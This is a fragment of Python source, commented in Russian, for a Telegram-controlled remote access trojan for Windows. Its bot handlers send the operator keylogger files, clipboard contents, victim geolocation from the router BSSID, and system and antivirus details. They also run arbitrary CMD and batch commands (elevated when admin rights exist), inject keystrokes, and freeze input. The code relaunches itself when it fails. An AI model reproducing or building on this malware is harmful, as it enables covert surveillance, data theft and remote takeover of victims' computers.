		bot.reply_to(command, '_Содержимое буфера обмена изменено!_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id,
			'_Введите свой текст_'
			'\n'
			'\n*› /Clipboard*'
			'\n'
			'\n_Содержимое буфера обмена_'
			'\n'
			'\n`' + GetClipboard() + '`',
				parse_mode='Markdown')

# Получить кейлог

@bot.message_handler(regexp='/Keylogger')
def Keylogger(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')
		Keylogs = open(os.getenv('Temp') + '\\Keylogs.txt', 'rb')
		bot.send_document(command.chat.id, Keylogs)

	except:
		bot.send_message(command.chat.id, '_Кейлоги не записаны._', parse_mode='Markdown')



@bot.message_handler(regexp='/SendKeys')
def SendKeys(command):
	try:

		Text = re.split('/SendKeys ', command.text, flags=re.I)[1]
		bot.send_message(command.chat.id, '_Набор клавиш..._', parse_mode='Markdown')
		SendKeyPress(Text)
		bot.reply_to(command, '_Текст успешно набран!_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Введите свой текст_\n\n*› /SendKeys*', parse_mode='Markdown')


# Поворот дисплея <0,90,180,270>

@bot.message_handler(regexp='/Rotate')
def Rotate(command):
	try:

		Position = re.split('/Rotate ', command.text, flags=re.I)[1]
		DisplayRotate(Degrees=Position)
		bot.reply_to(command, '_Дисплей был повернут!_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id,
			'_Выберите поворот дисплея_'
			'\n'
			'\n*› /Rotate*'
			'\n'
			'\n_Режим (положения)_'
			'\n_0 - Дефолт_'
			'\n_90 - Один поворот_'
			'\n_180 - Два поворота_'
			'\n_270 - Три поворота_'
			'\n_Чтобы вернуть в дефолт - 0'
			'\n'
			'\n`0` / `90` / `180` / `270`',
				parse_mode='Markdown')


# Регулятор громкости звука

@bot.message_handler(regexp='/Volume')
def Volume(command):
	try:

		Level = re.split('/Volume ', command.text, flags=re.I)[1]
		VolumeControl(Level)
		bot.send_message(command.chat.id, '_Громкость звука установлена на_ *' + Level + '*!_', parse_mode='Markdown')

	except ValueError:
		bot.send_message(command.chat.id, '_Укажите уровень громкости в цифрах_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Укажите громкость звука_\n\n*› /Volume*', parse_mode='Markdown')


# Монитор <on/off>

@bot.message_handler(regexp='/Monitor')
def Monitor(command):
	try:

		Monitor = re.split('/Monitor ', command.text, flags=re.I)[1]

		if Monitor.lower() == 'Off'.lower():
			Off()
			bot.reply_to(command, '_Монитор был выключен_', parse_mode='Markdown')

		if Monitor.lower() == 'On'.lower():
			On()
			bot.reply_to(command, '_Монитор был включен_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, 
			'_Выберите вариант_'
			'\n'
			'\n*› /Monitor*'
			'\n'
			'\n_Варианты_'
			'\n'
			'\n`On` / `Off`',
				parse_mode='Markdown')

# Блокирует пользование (клавиатурой и мышью) на выбранное кол-во секунд


@bot.message_handler(regexp='/Freeze')
def Freeze(command):

	if Admin() is False:
		bot.send_message(command.chat.id, '_Эта функция требует прав админа._', parse_mode='Markdown')

	if Admin() is True:
		try:

			Seconds = re.split('/Freeze ', command.text, flags=re.I)[1]
			bot.send_message(command.chat.id, '_Клава и мышь заблокирована на_ *' + Seconds + '* _секунд!_', parse_mode='Markdown')
			Block(float(Seconds))
			bot.reply_to(command, '_Клавиатура и мышь теперь разблокированы!_', parse_mode='Markdown')

		except ValueError:
			bot.reply_to(command, '_Укажите продолжительность блокировки в секундах._', parse_mode='Markdown')

		except:
			bot.send_message(command.chat.id, '_Укажите продолжительность блокировки_\n\n*› /Freeze*', parse_mode='Markdown')


# Управление CD-ROM

@bot.message_handler(regexp='/DVD')
def DVD(command):
	try:

		DVD = re.split('/DVD ', command.text, flags=re.I)[1]

		if DVD.lower() == 'Открыть'.lower():
			OpenCD()
			bot.reply_to(command, '_Дисковод был открыт!_', parse_mode='Markdown')

		if DVD.lower() == 'Закрыть'.lower():
			CloseCD()
			bot.reply_to(command, '_Дисковод был закрыт!_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, 
			'_Выберите вариант_'
			'\n'
			'\n*› /DVD*'
			'\n'
			'\n_Варианты_'
			'\n'
			'\n`Открыть` / `Закрыть`',
				parse_mode='Markdown')


# Удаленное выполнение команды (CMD)

@bot.message_handler(regexp='/CMD')
def CMD(command):
	try:

		Command = re.split('/CMD ', command.text, flags=re.I)[1]
		CMD = subprocess.Popen(Command,
			shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

		Lines = []
		for Line in CMD.stdout.readlines():
			Line = Line.strip()
			if Line:
				Lines.append(Line.decode('cp866'))
				Output = '\n'.join(Lines)

		bot.send_message(command.chat.id, Output)

	except:
		try:

			Command = re.split('/CMD ', command.text, flags=re.I)[1]
			SplittedText = telebot.util.split_string(Output, 4096)
			for Output in SplittedText:

				bot.send_message(command.chat.id, Output)

		except UnboundLocalError:
			bot.reply_to(command, '_Команда выполнена!_', parse_mode='Markdown')

		except:
			bot.send_message(command.chat.id, '_Введите вашу команду_\n\n*› /CMD*', parse_mode='Markdown')


# Удаленное выполнение команд (BAT)

@bot.message_handler(regexp='/BAT')
def BAT(command):
	try:

		Command = re.split('/BAT ', command.text, flags=re.I)[1]	
		File = Directory + 'Command.bat'
		BatchFile = open(File, 'w').write(Command)
	
		if Admin() is False:
			os.startfile(File)
	
		if Admin() is True:
			os.startfile(File, 'runas')

		bot.reply_to(command, '_Команда выполнена!_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Введите свою команду_\n\n*› /BAT*', parse_mode='Markdown')


# Получение местоположения по BSSID

@bot.message_handler(regexp='/Location')
def Location(command):
	try:

		bot.send_chat_action(command.chat.id, 'find_location')
		Coordinates = GetLocationByBSSID(GetMacByIP())
		Latitude = Coordinates['lat']
		Longitude = Coordinates['lon']
		bot.send_location(command.chat.id, Latitude, Longitude)
		bot.send_message(command.chat.id,
			'_ Местоположение_'
			'\n'
			'\n*IP Адресс* » `' + Geolocation('query') + '`' +
			'\n*Страна* » `' + Geolocation('country') + '`' +
			'\n*Город* » `' + Geolocation('city') + '`' +
			'\n'
			'\n*Широта* » `' + str(Coordinates['lat']) + '`' +
			'\n*Долгота* » `' + str(Coordinates['lon']) + '`' +
			'\n*Диапазон* » `' + str(Coordinates['range']) + '`' +
			'\n'
			'\n*BSSID* » `' + GetMacByIP() + '`',
				parse_mode='Markdown') 

	except:
		bot.send_message(command.chat.id,
			'_Не удалось найти цель по BSSID_'
			'\n'
			'\n*IP Адрес* » `' + Geolocation('query') + '`' +
			'\n*Страна* » `' + Geolocation('country') + '`' +
			'\n*Город* » `' + Geolocation('city') + '`' +
			'\n'
			'\n*BSSID* » `' + GetMacByIP() + '`',
				parse_mode='Markdown') 


# Системная информация

@bot.message_handler(regexp='/Info')
def Info(command):
	try:

		bot.send_chat_action(command.chat.id, 'typing')
		bot.send_message(command.chat.id, 
			'\n_Информация о пк_'
			'\n'
			'\n*Версия ОС* » `' + Windows() + '`' +
			'\n*Название компьютера* » `' + str(Computer('ComputerSystem', 'Name')) + '`' +
			'\n*Модель компьютера* » `' + str(Computer('ComputerSystem', 'Model')) + '`' +
			'\n*Производитель* » `' + str(Computer('ComputerSystem', 'Manufacturer')) + '`' +
			'\n*Системное время* » `' + SystemTime() + '`' +
			'\n*Имя пользователя* » `' + os.getlogin() + '`' +
			'\n'
			'\n'
			'\n_Железо_'
			'\n'
			'\n*CPU* » `' + str(Computer('CPU', 'Name')) + '`' +
			'\n*GPU* » `' + str(Computer('path Win32_VideoController', 'Name')) + '`' +
			'\n*RAM* » `' + str(RAM()) + '`' +
			'\n*ARM* » `' + platform.architecture()[0] + '`' +
			'\n'
			'\n'
			'\n_Защита_'
			'\n'
			'\n*Запущено с правами Администратора* » `' + str(Admin())+ '`' +
			'\n*Защищен ли процесс (в конфиге)* » `' + str(ProcessBSODProtectionEnabled) + '`' +
			'\n*Установленные антивирусы* » `' + Antivirus[0] + '`',
				parse_mode='Markdown')

	except:
		pass

# Навигационные кнопки

@bot.message_handler(commands=['3', '6'])
def Main(command):
	bot.send_message(command.chat.id, '`...`', reply_markup=menu, parse_mode='Markdown')

@bot.message_handler(commands=['2', '5'])
def Main(command):
	bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode='Markdown')

@bot.message_handler(commands=['4', '1'])
def Main(command):
	bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode='Markdown')

@bot.message_handler(commands=['Power', 'power'])
def Power(command):
	bot.send_message(command.chat.id, '_Выберите действие_', reply_markup=main2, parse_mode='Markdown')

@bot.message_handler(commands=['Autorun', 'autorun'])
def Autorun(command):
	bot.send_message(command.chat.id, '_Выберите действие_', reply_markup=main3, parse_mode='Markdown')

@bot.message_handler(commands=['Files', 'files'])
def Files(command):
	bot.send_message(command.chat.id, '`...`', reply_markup=main7, parse_mode='Markdown')

@bot.message_handler(commands=['Cancel'])
def CancelFiles(command):
	bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode='Markdown')

@bot.message_handler(commands=['Wallpapers', 'wallpapers'])
def Wallpapers(command):
	bot.send_message(command.chat.id, '_Отправьте фотографию, которую вы хотите установить на обои_', parse_mode='Markdown')


try:
	bot.polling(none_stop=True)
except:
	os.startfile(CurrentPath)
	sys.exit()
